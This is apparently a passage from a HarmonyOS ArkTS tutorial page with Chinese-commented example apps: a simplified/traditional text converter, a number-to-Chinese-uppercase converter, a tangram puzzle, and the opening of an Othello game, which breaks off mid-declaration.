TransverterLanguage.ZH_CN &#125;); // 将inputText转换为繁体，并更新traditionalResult this.traditionalResult = transverter(&#123; type: TransverterType.TRADITIONAL, str: this.inputText, language: TransverterLanguage.ZH_CN &#125;); &#125; // 将给定的文本复制到剪贴板，并显示提示信息 private copyToClipboard(text: string): void &#123; const clipboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemClipboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemClipboard.setData(clipboardData); // 设置剪贴板数据 promptAction.showToast(&#123; message: &#x27;已复制到剪贴板&#x27; &#125;); // 显示复制成功的提示 &#125; // 构建组件的UI build() &#123; Scroll() &#123; // 创建可滚动的容器 Column() &#123; // 在滚动容器中创建垂直布局 // 创建标题文本 Text(&quot;简体繁体转换器&quot;) .width(&#x27;100%&#x27;) .height(54) .fontSize(18) .fontWeight(600) .backgroundColor(Color.White) .textAlign(TextAlign.Center) .fontColor(this.textColor); // 创建用户输入区域 Column() &#123; // 创建多行文本输入框 TextArea(&#123; text: $$this.inputText, placeholder: &#x27;请输入简体/繁体字（支持混合输入）&#x27; &#125;) .fontSize(18) .placeholderColor(this.isInputFocused ? this.themeColor : Color.Gray) .fontColor(this.isInputFocused ? this.themeColor : this.textColor) .borderColor(this.isInputFocused ? this.themeColor : Color.Gray) .caretColor(this.themeColor) .onBlur(() =&gt; this.isInputFocused = false) // 当输入框失去焦点时，更新isInputFocused状态 .onFocus(() =&gt; this.isInputFocused = true) // 当输入框获得焦点时，更新isInputFocused状态 .borderWidth(1) .borderRadius(10) .backgroundColor(Color.White) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;); // 创建清空按钮 Text(&#x27;清空&#x27;) .borderWidth(1) .borderColor(this.themeColor) .fontColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) // 添加点击效果 .onClick(() =&gt; this.inputText = &quot;&quot;); // 清空输入框 &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: 20 &#125;) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // 创建繁体结果展示与复制区域 Column() &#123; // 创建繁体结果标题 Text(`繁体结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // 创建繁体结果展示文本 Text(`$&#123;this.traditionalResult&#125;`) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin(&#123; top: `$&#123;this.basePadding / 3&#125;lpx` &#125;); // 创建复制繁体结果按钮 Text(&#x27;复制&#x27;) .enabled(this.traditionalResult ? true : false) // 只有当有繁体结果时，按钮才可用 .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; this.copyToClipboard(this.traditionalResult)); // 复制繁体结果到剪贴板 &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); // 创建简体结果展示与复制区域 Column() &#123; // 创建简体结果标题 Text(`简体结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // 创建简体结果展示文本 Text(`$&#123;this.simplifiedResult&#125;`) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin(&#123; top: `$&#123;this.basePadding / 3&#125;lpx` &#125;); // 创建复制简体结果按钮 Text(&#x27;复制&#x27;) .enabled(this.simplifiedResult ? true : false) // 只有当有简体结果时，按钮才可用 .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; this.copyToClipboard(this.simplifiedResult)); // 复制简体结果到剪贴板 &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); &#125; &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&quot;#f2f3f5&quot;) .align(Alignment.Top) .padding(&#123; bottom: `$&#123;this.basePadding&#125;lpx` &#125;); &#125;&#125; Up Lower数字转中文大小写 12ohpm install @nutpi/chinese-finance-numberohpm install @nutpi/chinese-number-format 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// 导入必要的模块import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // 用于显示提示信息import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;; // 用于处理剪贴板操作import &#123; toChineseNumber &#125; from &#x27;@nutpi/chinese-finance-number&#x27;; // 将数字转换为中文大写金额import &#123; toChineseWithUnits, // 将数字转换为带单位的中文 toUpperCase, // 将中文小写转换为大写&#125; from &#x27;@nutpi/chinese-number-format&#x27;; @Entry // 标记此组件为入口点@Component // 定义一个组件struct NumberToChineseConverter &#123; @State private exampleNumber: number = 88.8; // 示例数字 @State private textColor: string = &quot;#2e2e2e&quot;; // 文本颜色 @State private lineColor: string = &quot;#d5d5d5&quot;; // 分割线颜色 @State private basePadding: number = 30; // 基础内边距 @State private chineseLowercase: string = &quot;&quot;; // 转换后的小写中文 @State private chineseUppercase: string = &quot;&quot;; // 转换后的中文大写 @State private chineseUppercaseAmount: string = &quot;&quot;; // 转换后的中文大写金额 @State @Watch(&#x27;inputChanged&#x27;) private inputText: string = &quot;&quot;; // 监听输入文本变化 // 当输入文本改变时触发的方法 inputChanged() &#123; this.chineseLowercase = toChineseWithUnits(Number(this.inputText), &#x27;zh-CN&#x27;); // 转换为小写中文并带上单位 this.chineseUppercase = toUpperCase(this.chineseLowercase, &#x27;zh-CN&#x27;); // 将小写中文转换为大写 this.chineseUppercaseAmount = toChineseNumber(Number(this.inputText)); // 转换为大写金额 &#125; // 复制文本到剪贴板的方法 private copyToClipboard(text: string): void &#123; const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemPasteboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemPasteboard.setData(pasteboardData); // 设置剪贴板数据 promptAction.showToast(&#123; message: &#x27;已复制&#x27; &#125;); // 显示复制成功的提示 &#125; // 构建用户界面的方法 build() &#123; Column() &#123; // 主列容器 // 页面标题 Text(&#x27;数字转中文大小写&#x27;) .fontColor(this.textColor) // 设置字体颜色 .fontSize(18) // 设置字体大小 .width(&#x27;100%&#x27;) // 设置宽度 .height(50) // 设置高度 .textAlign(TextAlign.Center) // 文本居中对齐 .backgroundColor(Color.White) // 设置背景颜色 .shadow(&#123; // 添加阴影效果 radius: 2, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 5 // Y轴偏移量 &#125;); Scroll() &#123; // 滚动视图 Column() &#123; // 内部列容器 // 工具介绍部分 Column() &#123; Text(&#x27;工具介绍&#x27;).fontSize(20).fontWeight(600).fontColor(this.textColor); // 设置介绍文字样式 Text(&#x27;将数字转换为中文格式，适用于票据填写、合同文书、财务报表等多种场景。支持从最小单位“分”到最大单位“千兆”的数字转换。&#x27;) .textAlign(TextAlign.JUSTIFY) .fontSize(18).fontColor(this.textColor).margin(&#123; top: `$&#123;this.basePadding / 2&#125;lpx` &#125;); // 设置介绍详情文字样式 &#125; .alignItems(HorizontalAlign.Start) // 对齐方式 .width(&#x27;650lpx&#x27;) // 设置宽度 .padding(`$&#123;this.basePadding&#125;lpx`) // 设置内边距 .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow(&#123; // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 &#125;); // 输入区 Column() &#123; Row() &#123; // 行容器 Text(&#x27;示例&#x27;) .fontColor(&quot;#5871ce&quot;) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`$&#123;this.basePadding / 2&#125;lpx`) // 设置内边距 .backgroundColor(&quot;#f2f1fd&quot;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 设置点击效果 .onClick(() =&gt; &#123; // 点击事件 this.inputText = `$&#123;this.exampleNumber&#125;`; // 设置输入框文本为示例数字 &#125;); Blank(); // 占位符 Text(&#x27;清空&#x27;) .fontColor(&quot;#e48742&quot;) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`$&#123;this.basePadding / 2&#125;lpx`) // 设置内边距 .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 设置点击效果 .backgroundColor(&quot;#ffefe6&quot;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .onClick(() =&gt; &#123; // 点击事件 this.inputText = &quot;&quot;; // 清空输入框 &#125;); &#125;.height(45) // 设置高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(&#x27;100%&#x27;); // 设置宽度 Divider().margin(&#123; top: 5, bottom: 5 &#125;); // 分割线 TextInput(&#123; text: $$this.inputText, placeholder: `请输入数字，例如：$&#123;this.exampleNumber&#125;` &#125;) // 输入框 .width(&#x27;100%&#x27;) // 设置宽度 .fontSize(18) // 设置字体大小 .caretColor(this.textColor) // 设置光标颜色 .fontColor(this.textColor) // 设置字体颜色 .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // 设置外边距 .padding(0) // 设置内边距 .backgroundColor(Color.Transparent) // 设置背景颜色 .borderRadius(0) // 设置圆角 .type(InputType.NUMBER_DECIMAL); // 设置输入类型为数字 &#125; .alignItems(HorizontalAlign.Start) // 对齐方式 .width(&#x27;650lpx&#x27;) // 设置宽度 .padding(`$&#123;this.basePadding&#125;lpx`) // 设置内边距 .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow(&#123; // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 &#125;); // 结果区 Column() &#123; Row() &#123; Text(`小写：$&#123;this.chineseLowercase&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示小写结果 Text(&#x27;复制&#x27;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`$&#123;this.basePadding / 2&#125;lpx`) // 设置内边距 .backgroundColor(&quot;#0052d9&quot;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 设置点击效果 .onClick(() =&gt; &#123; // 点击事件 this.copyToClipboard(this.chineseLowercase); // 复制小写结果到剪贴板 &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(&#x27;100%&#x27;); // 设置宽度 Divider().margin(&#123; top: 5, bottom: 5 &#125;); // 分割线 Row() &#123; Text(`大写：$&#123;this.chineseUppercase&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示大写结果 Text(&#x27;复制&#x27;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`$&#123;this.basePadding / 2&#125;lpx`) // 设置内边距 .backgroundColor(&quot;#0052d9&quot;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 设置点击效果 .onClick(() =&gt; &#123; // 点击事件 this.copyToClipboard(this.chineseUppercase); // 复制大写结果到剪贴板 &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(&#x27;100%&#x27;); // 设置宽度 Divider().margin(&#123; top: 5, bottom: 5 &#125;); // 分割线 Row() &#123; Text(`大写金额：$&#123;this.chineseUppercaseAmount&#125;`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示大写金额结果 Text(&#x27;复制&#x27;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`$&#123;this.basePadding / 2&#125;lpx`) // 设置内边距 .backgroundColor(&quot;#0052d9&quot;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 设置点击效果 .onClick(() =&gt; &#123; // 点击事件 this.copyToClipboard(this.chineseUppercaseAmount); // 复制大写金额结果到剪贴板 &#125;); &#125;.constraintSize(&#123; minHeight: 45 &#125;) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(&#x27;100%&#x27;); // 设置宽度 &#125; .alignItems(HorizontalAlign.Start) // 对齐方式 .width(&#x27;650lpx&#x27;) // 设置宽度 .padding(`$&#123;this.basePadding&#125;lpx`) // 设置内边距 .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow(&#123; // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 &#125;); &#125; &#125;.scrollBar(BarState.Off).clip(false); // 关闭滚动条，不允许裁剪 &#125; .height(&#x27;100%&#x27;) // 设置高度 .width(&#x27;100%&#x27;) // 设置宽度 .backgroundColor(&quot;#f4f8fb&quot;); // 设置页面背景颜色 &#125;&#125; Tangram七巧板 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201@ObservedV2 // 监听数据变化的装饰器class TangramBlock &#123; // 定义七巧板类 width: number; // 宽度 height: number; // 高度 points: Array&lt;[number, number]&gt;; // 点坐标数组 color: string; // 颜色 @Trace initialOffsetX: number; // 初始X偏移量 @Trace initialOffsetY: number; // 初始Y偏移量 @Trace currentOffsetX: number; // 当前X偏移量 @Trace currentOffsetY: number; // 当前Y偏移量 @Trace rotationAngle: number; // 旋转角度 @Trace flipAngle: number = 0; // 翻转角度，默认为0 @Trace rotateValue: number; // 旋转值 defaultInitialOffsetX: number; // 默认初始X偏移量 defaultInitialOffsetY: number; // 默认初始Y偏移量 defaultRotationAngle: number; // 默认旋转角度 constructor(color: string, width: number, height: number, initialOffsetX: number, initialOffsetY: number, rotationAngle: number, points: Array&lt;[number, number]&gt;) &#123; this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX = initialOffsetX; // 初始化X偏移量 this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY = initialOffsetY; // 初始化Y偏移量 this.rotationAngle = this.rotateValue = this.defaultRotationAngle = rotationAngle; // 初始化旋转角度 this.color = color; // 设置颜色 this.width = width; // 设置宽度 this.height = height; // 设置高度 this.points = points; // 设置点坐标数组 &#125; resetData() &#123; // 重置数据方法 this.flipAngle = 0; // 重置翻转角度 this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX; // 重置初始X偏移量 this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY; // 重置初始Y偏移量 this.rotationAngle = this.rotateValue = this.defaultRotationAngle; // 重置旋转角度 &#125;&#125; const baseUnitLength: number = 80; // 基本单位长度 @Entry // 入口组件@Component // 定义组件export struct Index &#123; // 主组件 @State selectedBlockIndex: number = -1; // 当前选中位置 @State blocks: TangramBlock[] = [// 七巧板数组 // 小直角等腰三角形 new TangramBlock(&quot;#fed8e5&quot;, baseUnitLength, baseUnitLength, -33.58, -58.02, 135, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), new TangramBlock(&quot;#0a0bef&quot;, baseUnitLength, baseUnitLength, 78.76, 54.15, 45, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), // 中直角等腰三角形 new TangramBlock(&quot;#ff0d0c&quot;, baseUnitLength * Math.sqrt(2), baseUnitLength * Math.sqrt(2), -33.16, -1.43, -90, [[0, 0], [baseUnitLength * Math.sqrt(2), 0], [0, baseUnitLength * Math.sqrt(2)]]), // 大直角等腰三角形 new TangramBlock(&quot;#ffa60a&quot;, baseUnitLength * 2, baseUnitLength * 2, 22.46, -172, -135, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), new TangramBlock(&quot;#3da56a&quot;, baseUnitLength * 2, baseUnitLength * 2, 135.65, -59.34, -45, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), // 正方形 new TangramBlock(&quot;#ffff0b&quot;, baseUnitLength, baseUnitLength, 23.07, -1.84, -45, [[0, 0], [baseUnitLength, 0], [baseUnitLength, baseUnitLength], [0, baseUnitLength]]), // 平行四边形 new TangramBlock(&quot;#5e0b9b&quot;, baseUnitLength * 2, baseUnitLength, -61.53, -85.97, 45, [[0, 0], [baseUnitLength, 0], [baseUnitLength * 2, baseUnitLength], [baseUnitLength, baseUnitLength]]) ]; build() &#123; // 构建方法 Column(&#123; space: 30 &#125;) &#123; // 创建垂直布局 Stack() &#123; // 创建堆叠布局 ForEach(this.blocks, (block: TangramBlock, index: number) =&gt; &#123; // 遍历七巧板数组 Stack() &#123; // 创建堆叠布局 Polygon(&#123; width: block.width, height: block.height &#125;)// 绘制多边形 .points(block.points)// 设置多边形顶点坐标 .fill(block.color)// 填充颜色 .draggable(false)// 长按不可拖动 .rotate(&#123; angle: block.rotationAngle &#125;) // 旋转角度 &#125; .rotate(&#123; // 旋转 x: 0, y: 1, z: 0, angle: block.flipAngle, centerX: block.width / 2, // 中心点X坐标 centerY: block.height / 2, // 中心点Y坐标 &#125;) .width(block.width) // 设置宽度 .height(block.height) // 设置高度 .onTouch(() =&gt; &#123; // 触摸事件 this.selectedBlockIndex = index; // 设置选中索引 &#125;) .draggable(false) // 长按不可拖动 .translate(&#123; x: block.initialOffsetX, y: block.initialOffsetY, z: 0 &#125;) // 平移 .gesture( // 手势操作 PanGesture()// 拖动手势 .onActionUpdate((event: GestureEvent | undefined) =&gt; &#123; // 更新事件 if (event) &#123; block.initialOffsetX = block.currentOffsetX + event.offsetX; // 更新X偏移量 block.initialOffsetY = block.currentOffsetY + event.offsetY; // 更新Y偏移量 &#125; &#125;) .onActionEnd((event: GestureEvent | undefined) =&gt; &#123; // 结束事件 if (event) &#123; block.currentOffsetX = block.initialOffsetX; // 更新当前X偏移量 block.currentOffsetY = block.initialOffsetY; // 更新当前Y偏移量 &#125; &#125;) ) .zIndex(this.selectedBlockIndex == index ? 1 : 0) // 设置层级 .borderWidth(2) // 边框宽度 .borderStyle(BorderStyle.Dashed) // 边框样式 .borderColor(this.selectedBlockIndex == index ? &quot;#80a8a8a8&quot; : Color.Transparent) // 边框颜色 &#125;) &#125;.width(&#x27;100%&#x27;).height(&#x27;750lpx&#x27;) // 设置宽高 .backgroundColor(&quot;#e4f2f5&quot;) // 背景颜色 // 旋转角度计数器 Column(&#123; space: 5 &#125;) &#123; // 创建垂直布局，设置间距 Text(`旋转角度(间隔5)`).fontColor(Color.Black) // 显示旋转角度文本，设置字体颜色 Counter() &#123; // 创建计数器组件 Text(`$&#123;this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : &#x27;-&#x27;&#125;`)// 显示当前选中七巧板的旋转角度或占位符 .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle += 5; // 增加旋转角度 &#125;) &#125; &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle -= 5; // 减少旋转角度 &#125;) &#125; &#125;); &#125; // 旋转角度计数器 Column(&#123; space: 5 &#125;) &#123; // 创建垂直布局，设置间距 Text(`旋转角度(间隔45)`).fontColor(Color.Black) // 显示旋转角度文本，设置字体颜色 Counter() &#123; // 创建计数器组件 Text(`$&#123;this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : &#x27;-&#x27;&#125;`)// 显示当前选中七巧板的旋转角度或占位符 .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle += 45; // 增加旋转角度 &#125;) &#125; &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 if (this.selectedBlockIndex != -1) &#123; animateTo(&#123;&#125;, () =&gt; &#123; this.blocks[this.selectedBlockIndex].rotationAngle -= 45; // 减少旋转角度 &#125;) &#125; &#125;); &#125; // 翻转按钮 Row() &#123; // 创建水平布局 Button(&#x27;向左翻转&#x27;).onClick(() =&gt; &#123; // 左翻转按钮点击事件 animateTo(&#123;&#125;, () =&gt; &#123; if (this.selectedBlockIndex != -1) &#123; this.blocks[this.selectedBlockIndex].flipAngle -= 180; // 减少翻转角度 &#125; &#125;); &#125;); Button(&#x27;向右翻转&#x27;).onClick(() =&gt; &#123; // 右翻转按钮点击事件 animateTo(&#123;&#125;, () =&gt; &#123; if (this.selectedBlockIndex != -1) &#123; this.blocks[this.selectedBlockIndex].flipAngle += 180; // 增加翻转角度 &#125; &#125;); &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) // 设置宽度和内容对齐方式 // 重置和隐藏边框按钮 Row() &#123; // 创建水平布局 Button(&#x27;重置&#x27;).onClick(() =&gt; &#123; // 重置按钮点击事件 animateTo(&#123;&#125;, () =&gt; &#123; for (let i = 0; i &lt; this.blocks.length; i++) &#123; this.blocks[i].resetData(); // 重置七巧板数据 &#125; this.selectedBlockIndex = -1; // 重置选中索引 &#125;); &#125;); Button(&#x27;隐藏边框&#x27;).onClick(() =&gt; &#123; // 隐藏边框按钮点击事件 this.selectedBlockIndex = -1; // 重置选中索引 &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) // 设置宽度和内容对齐 &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) &#125;&#125; Reversi翻转棋（Reversi）、奥赛罗棋（Othello）、苹果棋或正反棋（Anti reversi） 黑白棋 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // 导入用于弹出对话框的工具 @ObservedV2class ChessCell &#123; // 定义棋盘上的单元格类 @Trace frontVisibility: number = 0; // 单元格上的棋子状态：0表示无子, 1表示黑子，2表示白子 @Trace rotationAngle: number = 0; // 单元格卡片的旋转角度 @Trace opacity: number = 1; // 透明度 isAnimationRunning: boolean = false; // 标记动画是否正在运行 flip(time: number) &#123; // 翻转棋子的方法 if (this.frontVisibility === 1) &#123; // 当前是黑子，要翻转成白子 this.showWhite(time); &#125; else if (this.frontVisibility === 2) &#123; // 当前是白子，要翻转成黑子 this.showBlack(time); &#125; &#125; showBlack(animationTime: number, callback?: () =&gt; void) &#123; // 展示黑色棋子 if (this.isAnimationRunning) &#123; // 如果已经有动画在运行，则返回 return; &#125; this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) &#123; // 如果不需要动画 this.rotationAngle = 0; // 设置旋转角度为0 this.frontVisibility = 1; // 黑子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; animateToImmediately(&#123; // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.frontVisibility = 1; // 看到黑色 this.rotationAngle = 0; // 设置旋转角度为0 &#125;); &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.rotationAngle = 90; // 设置旋转角度为90度 &#125;); &#125; showWhite(animationTime: number, callback?: () =&gt; void) &#123; // 展示白色棋子 if (this.isAnimationRunning) &#123; // 如果已经有动画在运行，则返回 return; &#125; this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) &#123; // 如果不需要动画 this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; animateToImmediately(&#123; // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.frontVisibility = 2; // 看到白色 this.rotationAngle = 180; // 设置旋转角度为180度 &#125;); &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.rotationAngle = 90; // 设置旋转角度为90度 &#125;); &#125; showWhiteAi(animationTime: number, callback?: () =&gt; void) &#123; // 展示白色棋子 if (this.isAnimationRunning) &#123; // 如果已经有动画在运行，则返回 return; &#125; this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) &#123; // 如果不需要动画 this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 animateToImmediately(&#123; // 开始动画 duration: animationTime * 3, // 动画持续时间 curve: Curve.EaseOut, iterations: 3, // 动画迭代次数 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; &#125;, () =&gt; &#123; this.opacity = 1; &#125;); &#125; &#125;, () =&gt; &#123; this.opacity = 0.2; &#125;); &#125;&#125; @ObservedV2class TileHighlight &#123; @Trace isValidMove: boolean = false;&#125; @Entry@Componentstruct OthelloGame &#123; @State chessBoard: ChessCell[][] = []; @State cellSize: number = 70; @State cellSpacing: number = 5; @State transitionDuration: number = 200; @State @Watch(&#x27;currentPlayerIsBlackChanged&#x27;) 